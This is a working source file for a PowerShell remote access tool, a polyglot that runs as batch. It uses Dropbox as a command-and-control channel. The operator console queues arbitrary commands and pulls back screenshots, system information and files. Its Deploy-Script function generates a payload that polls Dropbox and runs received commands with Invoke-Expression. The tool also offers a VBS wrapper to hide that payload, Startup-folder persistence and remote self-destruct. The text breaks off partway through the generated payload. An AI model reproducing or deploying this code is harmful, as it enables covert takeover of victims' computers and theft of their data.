<# :

@echo off & setlocal enabledelayedexpansion

powershell -noprofile -executionpolicy bypass "iex ((gc '%~f0') -join \"`n\")"
exit /b

: #>

$ProfileFile = "ATRprofiles.txt"
$CurrentProfile = $null

function Show-Help {
    Write-Host "`nAvailable Commands:" -ForegroundColor White
    Write-Host "  profile-add      - Create a new profile" -ForegroundColor White
    Write-Host "  profile-set      - Select an existing profile" -ForegroundColor White
    Write-Host "  profile-del      - Delete a profile" -ForegroundColor White
    Write-Host "  profile-list     - List all available profiles" -ForegroundColor White
    Write-Host "  profile-details  - Show details of current profile" -ForegroundColor White
    Write-Host ""
    Write-Host "  cmd              - Send a command" -ForegroundColor White
    Write-Host "  cmd-list         - Lists all commands" -ForegroundColor White
    Write-Host "  cmd-get          - Shows a command" -ForegroundColor White
    Write-Host "  cmd-del          - Removes a command" -ForegroundColor White
    Write-Host "  repo             - Downloads the whole dropbox repository" -ForegroundColor White
    Write-Host ""
    Write-Host "  fetch            - Fetch system information" -ForegroundColor White
    Write-Host "  screenshot       - Capture a screenshot" -ForegroundColor White
    Write-Host "  tree             - Capture tree output" -ForegroundColor White
    Write-Host "  download         - Download a file" -ForegroundColor White
    Write-Host "  selfdestruct /pc - Self destruct payloads" -ForegroundColor White
    Write-Host ""
    Write-Host "  deploy           - Create the payload" -ForegroundColor White
    Write-Host "  wrap             - Create a vbs file that hides the payload" -ForegroundColor White
    Write-Host "  init             - Create the init script" -ForegroundColor White
    Write-Host "  clear            - Clear the screen" -ForegroundColor White
    Write-Host "  help             - Show this help message" -ForegroundColor White
    Write-Host "  exit             - Exit the application" -ForegroundColor White
    Write-Host ""
}

function Profile-New {
    param([string]$FilePath = $ProfileFile)

    $ProfileName  = Read-Host "`nProfile name"
    $AppKey       = Read-Host "App Key"
    $AppSecret    = Read-Host "App Secret"
    $RefreshToken = Read-Host "Refresh Token"
    Write-Host ""

    $ProfileLine = "$($ProfileName.Trim()),$($AppKey.Trim()),$($AppSecret.Trim()),$($RefreshToken.Trim())"

    if (-not (Test-Path $FilePath)) { New-Item -Path $FilePath -ItemType File -Force | Out-Null }

    Add-Content -Path $FilePath -Value $ProfileLine -Encoding UTF8

    Write-Host "Profile '$($ProfileName.Trim())' added successfully" -ForegroundColor DarkGreen
    Write-Host ""
}

function Get-Profiles {
    param([string]$FilePath = $ProfileFile)
    
    $Profiles = @()
    if (-not (Test-Path $FilePath)) { return $Profiles }

    $Lines = Get-Content $FilePath | Where-Object { $_.Trim() -ne "" }

    $index = 1
    foreach ($Line in $Lines) {
        $Line = $Line.Trim()
        $Parts = ($Line -split ",", 4)
        if ($Parts.Count -lt 4) { continue }

        $Profiles += [PSCustomObject]@{
            DisplayIndex = $index
            Name         = $Parts[0].Trim()
            AppKey       = $Parts[1].Trim()
            AppSecret    = $Parts[2].Trim()
            RefreshToken = $Parts[3].Trim()
            RawLine      = $Line
            InternalIndex = $index - 1
        }
        $index++
    }
    
    return $Profiles
}

function Profile-Set {
    param([string]$FilePath = $ProfileFile)

    $Profiles = Get-Profiles -FilePath $FilePath
    if ($Profiles.Count -eq 0) { Write-Host "No profiles exist" -ForegroundColor DarkRed; return $null }

    Write-Host "`nProfiles:" -ForegroundColor White
    foreach ($p in $Profiles) { Write-Host "  $($p.DisplayIndex): $($p.Name)" -ForegroundColor White }
    Write-Host ""

    $Selection = Read-Host "Profile index"
    Write-Host ""

    $selectedProfile = $Profiles | Where-Object { $_.DisplayIndex -eq $Selection }

    if ($selectedProfile) {
        return $selectedProfile
    } else {
        Write-Host "Invalid selection" -ForegroundColor DarkRed
        return $null
    }
    Write-Host ""
}

function Profile-Del {
    param([string]$FilePath = $ProfileFile)

    $Profiles = Get-Profiles -FilePath $FilePath
    if ($Profiles.Count -eq 0) { Write-Host "No profiles exist" -ForegroundColor DarkRed; return }

    Write-Host "`nProfiles:" -ForegroundColor White
    foreach ($p in $Profiles) { Write-Host "  $($p.DisplayIndex): $($p.Name)" }
    Write-Host ""

    $Selection = Read-Host "Profile index"
    Write-Host ""

    $profileToDelete = $Profiles | Where-Object { $_.DisplayIndex -eq $Selection }

    if ($profileToDelete) {
        $Lines = Get-Content $FilePath | Where-Object { $_.Trim() -ne "" }
        $NewLines = @()

        $found = $false
        foreach ($Line in $Lines) {
            if ($Line.Trim() -eq $profileToDelete.RawLine -and -not $found) {
                $found = $true
                continue
            }
            $NewLines += $Line
        }

        if ($NewLines.Count -eq 0) {
            Remove-Item $FilePath -Force
            Write-Host "All profiles deleted, profile file removed" -ForegroundColor DarkGreen
        } else {
            Set-Content -Path $FilePath -Value $NewLines -Encoding UTF8
            Write-Host "Profile '$($profileToDelete.Name)' deleted successfully" -ForegroundColor DarkGreen
        }

        if ($CurrentProfile -and $CurrentProfile.Name -eq $profileToDelete.Name) {
            $script:CurrentProfile = $null
            Write-Host "Current profile cleared" -ForegroundColor DarkGreen
        }
    } else {
        Write-Host "Invalid selection" -ForegroundColor DarkRed
    }
    Write-Host ""
}

function Profile-List {
    param([string]$FilePath = $ProfileFile)

    $Profiles = Get-Profiles -FilePath $FilePath
    if ($Profiles.Count -eq 0) { Write-Host "No profiles exist" -ForegroundColor DarkRed; return }

    Write-Host "`nProfiles:" -ForegroundColor White
    foreach ($p in $Profiles) {
        $currentIndicator = if ($CurrentProfile -and $CurrentProfile.Name -eq $p.Name) { " (current)" } else { "" }
        Write-Host "  $($p.DisplayIndex): $($p.Name)$currentIndicator" -ForegroundColor DarkYellow
    }
    Write-Host ""
}

function Profile-Details {
    param([string]$FilePath = $ProfileFile)

    if (-not $CurrentProfile) { Write-Host "No profile selected" -ForegroundColor DarkRed; return }

    Write-Host "`nProfile Details:" -ForegroundColor White
    Write-Host "  Name:          $($CurrentProfile.Name)" -ForegroundColor DarkYellow
    Write-Host "  App Key:       $($CurrentProfile.AppKey)" -ForegroundColor DarkYellow
    Write-Host "  App Secret:    $($CurrentProfile.AppSecret)" -ForegroundColor DarkYellow
    Write-Host "  Refresh Token: $($CurrentProfile.RefreshToken)" -ForegroundColor DarkYellow
    Write-Host ""
}

function Send-Command {
    param(
        [string]$FilePath = $ProfileFile,
        [string]$CommandString
    )

    if (-not $CurrentProfile) {
        Write-Host "No profile selected" -ForegroundColor DarkRed
        return 
    }

    if (-not $CommandString) {
        $Command = Read-Host "Cmd"
        if ($Command.Trim() -eq "") {
            Write-Host "No command entered" -ForegroundColor DarkRed
            return
        }
    } else {
        $Command = $CommandString
    }

    try {
        Write-Host "Getting access token..." -ForegroundColor White

        $tokenUri = "https://api.dropbox.com/oauth2/token"
        $body = @{
            grant_type = "refresh_token"
            refresh_token = $CurrentProfile.RefreshToken
            client_id = $CurrentProfile.AppKey
            client_secret = $CurrentProfile.AppSecret
        }

        $response = Invoke-RestMethod -Uri $tokenUri -Method Post -Body $body -ContentType "application/x-www-form-urlencoded"
        $accessToken = $response.access_token

        Write-Host "Access token obtained successfully" -ForegroundColor DarkGreen

        Write-Host "Checking existing command files..." -ForegroundColor White

        $listUri = "https://api.dropboxapi.com/2/files/list_folder"
        $listHeaders = @{
            "Authorization" = "Bearer $accessToken"
            "Content-Type" = "application/json"
        }
        $listBody = @{ path = "" } | ConvertTo-Json

        $files = Invoke-RestMethod -Uri $listUri -Method Post -Headers $listHeaders -Body $listBody
        $commandFiles = $files.entries | Where-Object { $_.name -like "cmd_*.txt" }

        $maxNumber = 0
        foreach ($file in $commandFiles) {
            if ($file.name -match "cmd_(\d+)\.txt") {
                $num = [int]$matches[1]
                if ($num -gt $maxNumber) {
                    $maxNumber = $num
                }
            }
        }

        $nextNumber = $maxNumber + 1
        $newFileName = "cmd_$nextNumber.txt"

        Write-Host "Uploading command as $newFileName..." -ForegroundColor White

        $uploadUri = "https://content.dropboxapi.com/2/files/upload"
        $apiArg = @{
            path = "/$newFileName"
            mode = "overwrite"
            autorename = $false
            mute = $false
        } | ConvertTo-Json -Compress

        $headers = @{
            "Authorization" = "Bearer $accessToken"
            "Dropbox-API-Arg" = $apiArg
            "Content-Type" = "application/octet-stream"
        }

        $bytes = [System.Text.Encoding]::UTF8.GetBytes($Command)
        $uploadResponse = Invoke-RestMethod -Uri $uploadUri -Method Post -Headers $headers -Body $bytes

        Write-Host "Command queued successfully as $newFileName" -ForegroundColor DarkGreen
        Write-Host "Position: $nextNumber" -ForegroundColor White

    } catch {
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor DarkRed
        if ($_.ErrorDetails.Message) {
            Write-Host "Details: $($_.ErrorDetails.Message)" -ForegroundColor DarkRed
        }
    }

    Write-Host ""
}

function List-Commands {
    if (-not $CurrentProfile) {
        Write-Host "No profile selected" -ForegroundColor DarkRed
        return
    }

    try {
        Write-Host "Getting access token..." -ForegroundColor White

        $tokenUri = "https://api.dropbox.com/oauth2/token"
        $body = @{
            grant_type = "refresh_token"
            refresh_token = $CurrentProfile.RefreshToken
            client_id = $CurrentProfile.AppKey
            client_secret = $CurrentProfile.AppSecret
        }

        $response = Invoke-RestMethod -Uri $tokenUri -Method Post -Body $body -ContentType "application/x-www-form-urlencoded"
        $accessToken = $response.access_token

        Write-Host "Access token obtained successfully" -ForegroundColor DarkGreen

        Write-Host "Listing queued commands..." -ForegroundColor White

        $listUri = "https://api.dropboxapi.com/2/files/list_folder"
        $listHeaders = @{
            "Authorization" = "Bearer $accessToken"
            "Content-Type" = "application/json"
        }
        $listBody = @{ path = "" } | ConvertTo-Json

        $files = Invoke-RestMethod -Uri $listUri -Method Post -Headers $listHeaders -Body $listBody
        $commandFiles = $files.entries | Where-Object { $_.name -like "cmd_*.txt" } | Sort-Object { 
            if ($_.name -match "cmd_(\d+)\.txt") { [int]$matches[1] } else { 0 }
        }

        if ($commandFiles.Count -eq 0) {
            Write-Host "No commands found" -ForegroundColor DarkYellow
            return
        }

        Write-Host "`nCommands:" -ForegroundColor White

        foreach ($file in $commandFiles) {
            if ($file.name -match "cmd_(\d+)\.txt") {
                $cmdNumber = $matches[1]
                $size = "$([math]::Round($file.size / 1024.0, 2)) KB"
                $modified = (Get-Date $file.client_modified).ToString("yyyy-MM-dd HH:mm:ss")
                Write-Host "  Cmd $cmdNumber | $size | $modified" -ForegroundColor White
            }
        }

        Write-Host "`nCommands in queue: $(@($commandFiles).Count)" -ForegroundColor White

    } catch {
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor DarkRed
        if ($_.ErrorDetails.Message) {
            Write-Host "Details: $($_.ErrorDetails.Message)" -ForegroundColor DarkRed
        }
    }

    Write-Host ""
}

function Get-Command {
    if (-not $CurrentProfile) {
        Write-Host "No profile selected" -ForegroundColor DarkRed
        return
    }

    $CommandId = Read-Host "Command number"

    if (-not $CommandId -or -not ($CommandId -match '^\d+$') -or [int]$CommandId -le 0) {
        Write-Host "Invalid command number" -ForegroundColor DarkRed
        return
    }

    $CommandId = [int]$CommandId

    try {
        Write-Host "Getting access token..." -ForegroundColor White

        $tokenUri = "https://api.dropbox.com/oauth2/token"
        $body = @{
            grant_type = "refresh_token"
            refresh_token = $CurrentProfile.RefreshToken
            client_id = $CurrentProfile.AppKey
            client_secret = $CurrentProfile.AppSecret
        }

        $response = Invoke-RestMethod -Uri $tokenUri -Method Post -Body $body -ContentType "application/x-www-form-urlencoded"
        $accessToken = $response.access_token

        Write-Host "Access token obtained successfully" -ForegroundColor DarkGreen

        $fileName = "cmd_$CommandId.txt"
        Write-Host "Reading command from $fileName..." -ForegroundColor White

        $downloadUri = "https://content.dropboxapi.com/2/files/download"
        $apiArg = @{ path = "/$fileName" } | ConvertTo-Json -Compress
        $headers = @{
            "Authorization" = "Bearer $accessToken"
            "Dropbox-API-Arg" = $apiArg
            "Content-Type" = "application/octet-stream"
        }

        try {
            $commandContent = Invoke-RestMethod -Uri $downloadUri -Method Post -Headers $headers
            Write-Host "`n  Command $CommandId Content:" -ForegroundColor White
            Write-Host $commandContent -ForegroundColor DarkYellow
        } catch {
            if ($_.Exception.Response.StatusCode -eq 409) {
                Write-Host "Command $CommandId not found" -ForegroundColor DarkYellow
            } else {
                throw $_
            }
        }

    } catch {
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor DarkRed
        if ($_.ErrorDetails.Message) {
            Write-Host "Details: $($_.ErrorDetails.Message)" -ForegroundColor DarkRed
        }
    }

    Write-Host ""
}

function Delete-Command {
    if (-not $CurrentProfile) {
        Write-Host "No profile selected" -ForegroundColor DarkRed
        return
    }

    $CommandId = Read-Host "Command number"
    
    if (-not $CommandId -or -not ($CommandId -match '^\d+$') -or [int]$CommandId -le 0) {
        Write-Host "Invalid command number" -ForegroundColor DarkRed
        return
    }

    $CommandId = [int]$CommandId

    try {
        Write-Host "Getting access token..." -ForegroundColor White

        $tokenUri = "https://api.dropbox.com/oauth2/token"
        $body = @{
            grant_type = "refresh_token"
            refresh_token = $CurrentProfile.RefreshToken
            client_id = $CurrentProfile.AppKey
            client_secret = $CurrentProfile.AppSecret
        }

        $response = Invoke-RestMethod -Uri $tokenUri -Method Post -Body $body -ContentType "application/x-www-form-urlencoded"
        $accessToken = $response.access_token

        Write-Host "Access token obtained successfully" -ForegroundColor DarkGreen

        $fileName = "cmd_$CommandId.txt"
        Write-Host "Attempting to delete $fileName..." -ForegroundColor White

        $deleteUri = "https://api.dropboxapi.com/2/files/delete_v2"
        $headers = @{
            "Authorization" = "Bearer $accessToken"
            "Content-Type" = "application/json"
        }
        $deleteBody = @{ path = "/$fileName" } | ConvertTo-Json

        try {
            $result = Invoke-RestMethod -Uri $deleteUri -Method Post -Headers $headers -Body $deleteBody
            Write-Host "Command $CommandId deleted successfully" -ForegroundColor DarkGreen
        } catch {
            if ($_.Exception.Response.StatusCode -eq 409) {
                Write-Host "Command $CommandId not found" -ForegroundColor DarkYellow
            } else {
                throw $_
            }
        }

    } catch {
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor DarkRed
        if ($_.ErrorDetails.Message) {
            Write-Host "Details: $($_.ErrorDetails.Message)" -ForegroundColor DarkRed
        }
    }

    Write-Host ""
}

function Send-SelfDestruct {
    param(
        [string]$FilePath = $ProfileFile,
        [string]$TargetComputer = $null
    )
    if (-not $CurrentProfile) {
        Write-Host "No profile selected" -ForegroundColor DarkRed
        return 
    }

    $removeWrapper = Read-Host "Destruct wrapper [y/n]"
    if ($removeWrapper -eq "" -or $removeWrapper -eq "y" -or $removeWrapper -eq "Y") {
        $wrapperName = Read-Host "Path: STARTUP\"
        if ($wrapperName) {
            $wrapperPath = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup\$wrapperName"
            $removeCommand = "Remove-Item '$wrapperPath' -Force -ErrorAction SilentlyContinue; "
        }
    }

    try {
        Write-Host "Getting access token..." -ForegroundColor White

        $tokenUri = "https://api.dropbox.com/oauth2/token"
        $body = @{
            grant_type = "refresh_token"
            refresh_token = $CurrentProfile.RefreshToken
            client_id = $CurrentProfile.AppKey
            client_secret = $CurrentProfile.AppSecret
        }

        $response = Invoke-RestMethod -Uri $tokenUri -Method Post -Body $body -ContentType "application/x-www-form-urlencoded"
        $accessToken = $response.access_token

        Write-Host "Access token obtained successfully" -ForegroundColor DarkGreen

        Write-Host "Uploading file..." -ForegroundColor White

        $uploadUri = "https://content.dropboxapi.com/2/files/upload"
        $headers = @{
            "Authorization" = "Bearer $accessToken"
            "Dropbox-API-Arg" = '{"path":"/selfdestruct.txt","mode":"overwrite","autorename":false,"mute":false}'
            "Content-Type" = "application/octet-stream"
        }

        $fileContent = if ($TargetComputer) { "/$TargetComputer" } else { "" }
        if ($removeCommand) {
            $fileContent += "`nWRAPPER_REMOVAL:`n$removeCommand`n" + 
                           "Remove-Item '$PSCommandPath' -Force -ErrorAction SilentlyContinue"
        }

        $bytes = [System.Text.Encoding]::UTF8.GetBytes($fileContent)

        $uploadResponse = Invoke-RestMethod -Uri $uploadUri -Method Post -Headers $headers -Body $bytes

        if ($TargetComputer) {
            Write-Host "Self destruct command sent for computer: $TargetComputer" -ForegroundColor DarkGreen
        } else {
            Write-Host "Self destruct command sent for ALL computers" -ForegroundColor DarkGreen
        }

        if ($removeCommand) {
            Write-Host "Wrapper removal command included for: $wrapperName" -ForegroundColor DarkGreen
        }

        Write-Host "File uploaded successfully" -ForegroundColor DarkGreen
        Write-Host "Path: $($uploadResponse.path_display)" -ForegroundColor White

    } catch {
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor DarkRed
        if ($_.ErrorDetails.Message) {
            Write-Host "Details: $($_.ErrorDetails.Message)" -ForegroundColor DarkRed
        }
    }

    Write-Host ""
}

function Repo-Download {
    param(
        [string]$RemotePath = "",
        [string]$LocalPath = ".\Repo"
    )

    if (-not $CurrentProfile) {
        Write-Host "No profile selected" -ForegroundColor DarkRed
        return 
    }

    try {
        Write-Host "Getting access token..." -ForegroundColor White

        $tokenUri = "https://api.dropbox.com/oauth2/token"
        $body = @{
            grant_type = "refresh_token"
            refresh_token = $CurrentProfile.RefreshToken
            client_id = $CurrentProfile.AppKey
            client_secret = $CurrentProfile.AppSecret
        }

        $response = Invoke-RestMethod -Uri $tokenUri -Method Post -Body $body -ContentType "application/x-www-form-urlencoded"
        $accessToken = $response.access_token

        Write-Host "Access token obtained successfully" -ForegroundColor DarkGreen

        if (!(Test-Path $LocalPath)) {
            New-Item -ItemType Directory -Path $LocalPath -Force
        }

        $listUri = "https://api.dropboxapi.com/2/files/list_folder"
        $downloadUri = "https://content.dropboxapi.com/2/files/download"

        $listHeaders = @{
            Authorization = "Bearer $accessToken"
            "Content-Type" = "application/json"
        }

        $listBody = @{path = $RemotePath; recursive = $true} | ConvertTo-Json
        Write-Host "Listing Dropbox contents from: $RemotePath" -ForegroundColor White

        $response = Invoke-RestMethod -Uri $listUri -Method Post -Headers $listHeaders -Body $listBody
        $entries = $response.entries

        Write-Host "Found $($entries.Count) items to download" -ForegroundColor DarkGreen

        $downloadedFiles = 0
        $createdFolders = 0
        $failedDownloads = 0

        foreach ($entry in $entries) {
            $remoteItemPath = $entry.path_display
            $localItemPath = Join-Path $LocalPath ($remoteItemPath.TrimStart('/'))

            if ($entry.'.tag' -eq 'folder') {
                if (!(Test-Path $localItemPath)) {
                    New-Item -ItemType Directory -Path $localItemPath -Force | Out-Null
                    $createdFolders++
                }
                Write-Host "Created folder: $localItemPath" -ForegroundColor DarkGreen
            } else {
                $fileDir = Split-Path $localItemPath -Parent
                if (!(Test-Path $fileDir)) {
                    New-Item -ItemType Directory -Path $fileDir -Force | Out-Null
                }

                $apiArg = @{path = $remoteItemPath}
                $apiArgJson = $apiArg | ConvertTo-Json -Compress

                $downloadHeaders = @{
                    Authorization = "Bearer $accessToken"
                    "Dropbox-API-Arg" = $apiArgJson
                    "Content-Type" = "application/octet-stream"
                }

                try {
                    $response = Invoke-WebRequest -Uri $downloadUri -Method Post -Headers $downloadHeaders

                    [System.IO.File]::WriteAllBytes($localItemPath, $response.Content)
                    $downloadedFiles++

                    $fileSize = if ($response.Headers['Dropbox-API-Result']) {
                        $result = $response.Headers['Dropbox-API-Result'] | ConvertFrom-Json
                        "$([math]::Round($result.size/1KB, 2)) KB"
                    } else {
                        "$([math]::Round($response.Content.Length/1KB, 2)) KB"
                    }

                    Write-Host "Downloaded: $localItemPath ($fileSize)" -ForegroundColor DarkGreen
                } catch {
                    $failedDownloads++
                    Write-Host "Failed to download $remoteItemPath`: $($_.Exception.Message)" -ForegroundColor DarkRed
                    if ($_.Exception.Response) {
                        $statusCode = $_.Exception.Response.StatusCode.value__
                        Write-Host "HTTP Status: $statusCode" -ForegroundColor DarkRed
                    }
                }

                Start-Sleep -Milliseconds 200
            }
        }

        Write-Host "Files downloaded: $downloadedFiles" -ForegroundColor White
        Write-Host "Folders created: $createdFolders" -ForegroundColor White
        Write-Host "Failed downloads: $failedDownloads" -ForegroundColor $(if ($failedDownloads -gt 0) { "DarkRed" } else { "White" })

    } catch {
        Write-Host "Error: $($_.Exception.Message)" -ForegroundColor DarkRed
        if ($_.ErrorDetails.Message) {
            Write-Host "Details: $($_.ErrorDetails.Message)" -ForegroundColor DarkRed
        }
    }

    Write-Host ""
}

function Deploy-Script {
    param([string]$FilePath = $ProfileFile)

    if (-not $CurrentProfile) {
        Write-Host "No profile selected" -ForegroundColor DarkRed
        return
    }

    Write-Host "Testing Dropbox credentials..." -ForegroundColor White
    try {
        $body = @{
            grant_type = "refresh_token"
            refresh_token = $CurrentProfile.RefreshToken
            client_id = $CurrentProfile.AppKey
            client_secret = $CurrentProfile.AppSecret
        }
        
        $response = Invoke-RestMethod -Uri "https://api.dropbox.com/oauth2/token" -Method Post -Body $body -ContentType "application/x-www-form-urlencoded"
        Write-Host "Credentials validated successfully" -ForegroundColor DarkGreen
    } catch {
        Write-Host "Error: Invalid credentials - $($_.Exception.Message)" -ForegroundColor DarkRed
        if ($_.ErrorDetails.Message) {
            Write-Host "Details: $($_.ErrorDetails.Message)" -ForegroundColor DarkRed
        }
        return
    }

    $responseTime = Read-Host "`nResponse time"

    if (-not ($responseTime -match '^\d+$')) {
        Write-Host "Invalid response time" -ForegroundColor DarkRed
        return
    }

    $pingDelay = Read-Host "Ping delay"

    if (-not ($pingDelay -match '^\d+$')) {
        Write-Host "Invalid ping delay" -ForegroundColor DarkRed
        return
    }

    Write-Host ""

    $batchContent = @"
<# :
@echo off
setlocal enabledelayedexpansion
set SCRIPT_PATH=%~f0
powershell -noprofile -executionpolicy bypass -command "iex (Get-Content -Raw '%~f0')"
exit /b
: #>

Add-Type -AssemblyName System.Web
`$clientId = "$($CurrentProfile.AppKey)"
`$clientSecret = "$($CurrentProfile.AppSecret)"
`$refreshToken = "$($CurrentProfile.RefreshToken)"
`$accessToken = `$null
`$tokenExpiryTime = `$null
`$responseTime = $responseTime
`$pingDelay = $pingDelay
`$computerName = `$env:COMPUTERNAME
`$logFileName = "log_`$computerName.txt"
`$lastPingTime = Get-Date
`$startupTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
`$firstRun = `$true

function Get-AccessToken {
    `$uri = "https://api.dropbox.com/oauth2/token"
    `$body = @{
        grant_type = "refresh_token"
        refresh_token = `$refreshToken
        client_id = `$clientId
        client_secret = `$clientSecret
    }
    try {
        `$response = Invoke-RestMethod -Uri `$uri -Method Post -Body `$body -ContentType "application/x-www-form-urlencoded"
        `$global:tokenExpiryTime = (Get-Date).AddSeconds(12600)
        return `$response.access_token
    }
    catch {
        Write-Host "Failed to get access token: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
        return `$null
    }
}

function Test-AccessToken {
    param(`$accessToken)
    if (-not `$accessToken) {
        return `$false
    }
    if (`$tokenExpiryTime -and ((`$tokenExpiryTime - (Get-Date)).TotalMinutes -gt 30)) {
        return `$true
    }
    `$uri = "https://api.dropboxapi.com/2/users/get_current_account"
    `$headers = @{
        Authorization = "Bearer `$accessToken"
        "Content-Type" = "application/json"
    }
    try {
        `$response = Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body "{}"
        `$global:tokenExpiryTime = (Get-Date).AddSeconds(12600)
        return `$true
    }
    catch {
        if (`$_.Exception.Response.StatusCode -eq 401) {
            return `$false
        }
        return `$true
    }
}

function Check-DropboxFiles {
    param(`$accessToken, `$pattern = "*.txt")
    `$uri = "https://api.dropboxapi.com/2/files/list_folder"
    `$headers = @{
        Authorization = "Bearer `$accessToken"
        "Content-Type" = "application/json"
    }
    `$body = @{ path = "" } | ConvertTo-Json
    try {
        `$response = Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body `$body
        `$matchingFiles = `$response.entries | Where-Object { `$_.name -like `$pattern }
        return `$matchingFiles
    }
    catch {
        if (`$_.Exception.Response.StatusCode -eq 401) {
            return `$null
        }
        Write-Host "Failed to check for files: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
        return `$null
    }
}

function Check-DropboxFile {
    param(`$accessToken, `$fileName)
    `$uri = "https://api.dropboxapi.com/2/files/list_folder"
    `$headers = @{
        Authorization = "Bearer `$accessToken"
        "Content-Type" = "application/json"
    }
    `$body = @{ path = "" } | ConvertTo-Json
    try {
        `$response = Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body `$body
        return (`$response.entries | Where-Object { `$_.name -eq `$fileName })
    }
    catch {
        if (`$_.Exception.Response.StatusCode -eq 401) {
            return `$null
        }
        Write-Host "Failed to check for file: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
        return `$null
    }
}

function Upload-File {
    param(`$accessToken, `$localContent, `$remotePath)
    `$uri = "https://content.dropboxapi.com/2/files/upload"
    `$apiArg = @{
        path = `$remotePath
        mode = "overwrite"
        autorename = `$true
        mute = `$true
    } | ConvertTo-Json -Compress
    `$headers = @{
        Authorization = "Bearer `$accessToken"
        "Dropbox-API-Arg" = `$apiArg
        "Content-Type" = "application/octet-stream"
    }
    try {
        `$response = Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body `$localContent
        return `$true
    }
    catch {
        if (`$_.Exception.Response.StatusCode -eq 401) {
            return `$false
        }
        Write-Host "Failed to upload file: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
        return `$false
    }
}

function Read-FileContent {
    param(`$accessToken, `$filePath = "/cmd.txt")
    `$uri = "https://content.dropboxapi.com/2/files/download"
    `$apiArg = @{ path = `$filePath } | ConvertTo-Json -Compress
    `$headers = @{
        Authorization = "Bearer `$accessToken"
        "Dropbox-API-Arg" = `$apiArg
        "Content-Type" = "application/octet-stream"
    }
    try {
        `$response = Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers
        return `$response
    }
    catch {
        if (`$_.Exception.Response.StatusCode -eq 409) {
            return `$null
        }
        Write-Host "Failed to read file content: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
        if (`$_.Exception.Response) {
            `$reader = New-Object System.IO.StreamReader(`$_.Exception.Response.GetResponseStream())
            `$reader.BaseStream.Position = 0
            `$reader.DiscardBufferedData()
            `$errorResponse = `$reader.ReadToEnd()
            Write-Host "Error details: `$errorResponse" -ForegroundColor DarkRed
        }
        return `$null
    }
}

function Delete-File {
    param(`$accessToken, `$filePath = "/cmd.txt")
    `$uri = "https://api.dropboxapi.com/2/files/delete_v2"
    `$headers = @{
        Authorization = "Bearer `$accessToken"
        "Content-Type" = "application/json"
    }
    `$body = @{ path = `$filePath } | ConvertTo-Json
    try {
        Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body `$body | Out-Null
        return `$true
    }
    catch {
        if (`$_.Exception.Response.StatusCode -eq 401) {
            return `$false
        }
        Write-Host "Failed to delete file: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
        return `$false
    }
}

function Append-ToLog {
    param(`$accessToken, `$message)
    `$logFile = Check-DropboxFile -accessToken `$accessToken -fileName `$logFileName
    `$newContent = `$message
    if (`$logFile) {
        `$existingContent = Read-FileContent -accessToken `$accessToken -filePath "/`$logFileName"
        if (`$existingContent) {
            `$newContent = `$existingContent + "`n" + `$message
        }
    }
    `$success = Upload-File -accessToken `$accessToken -localContent `$newContent -remotePath "/`$logFileName"
    if (-not `$success) {
        Write-Host "Failed to append to log file" -ForegroundColor DarkRed
        return `$false
    }
    return `$true
}

function Update-LastPing {
    param(`$accessToken)
    `$currentTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    `$newFirstLine = "# LAST PING ON `$currentTime"
    `$logFile = Check-DropboxFile -accessToken `$accessToken -fileName `$logFileName
    `$newContent = `$newFirstLine
    if (`$logFile) {
        `$existingContent = Read-FileContent -accessToken `$accessToken -filePath "/`$logFileName"
        if (`$existingContent) {
            `$contentArray = `$existingContent -split "`n"
            if (`$contentArray.Count -gt 1) {
                `$contentArray[0] = `$newFirstLine
                `$newContent = `$contentArray -join "`n"
            }
        }
    }
    `$success = Upload-File -accessToken `$accessToken -localContent `$newContent -remotePath "/`$logFileName"
    if (-not `$success) {
        Write-Host "Failed to update last ping" -ForegroundColor DarkRed
        return `$false
    } else {
        Write-Host "Updated last ping for `$logFileName" -ForegroundColor White
        return `$true
    }
}

function Process-Command {
    param(`$accessToken, `$fileName)
    `$command = Read-FileContent -accessToken `$accessToken -filePath "/`$fileName"
    if (-not `$command) {
        Write-Host "No command found or error reading file" -ForegroundColor DarkRed
        return `$false
    }
    try {
        Write-Host "Executing command from `$fileName : `$command" -ForegroundColor White
        `$deleteSuccess = Delete-File -accessToken `$accessToken -filePath "/`$fileName"
        if (-not `$deleteSuccess) {
            Write-Host "Failed to delete command file before execution" -ForegroundColor DarkRed
            return `$false
        }
        Invoke-Expression `$command
        `$currentTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        `$commandLogMessage = "# EXECUTED COMMAND FROM `$fileName ON `$(`$currentTime)`n`$(`$command)"
        `$logSuccess = Append-ToLog -accessToken `$accessToken -message `$commandLogMessage
        if (-not `$logSuccess) {
            Write-Host "Failed to log command execution" -ForegroundColor DarkYellow
        }
        return `$true
    }
    catch {
        Write-Host "Failed to execute command: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
        return `$false
    }
}

function Check-SelfDestruct {
    param(`$accessToken)
    `$selfDestructFile = Check-DropboxFile -accessToken `$accessToken -fileName "selfdestruct.txt"
    if (`$selfDestructFile) {
        `$selfDestructContent = Read-FileContent -accessToken `$accessToken -filePath "/selfdestruct.txt"
        if (-not `$selfDestructContent) {
            `$selfDestructContent = ""
        }
        `$shouldSelfDestruct = `$false
        `$wrapperRemovalCommand = `$null
        if (`$selfDestructContent -match "WRAPPER_REMOVAL:`n(.*?)(`n|`$)") {
            `$wrapperRemovalCommand = `$matches[1].Trim()
        }
        `$targetComputer = `$null
        if (`$selfDestructContent -match "^/([^`n]+)") {
            `$targetComputer = `$matches[1].Trim()
        }
        if (`$targetComputer) {
            if (`$env:COMPUTERNAME -eq `$targetComputer) {
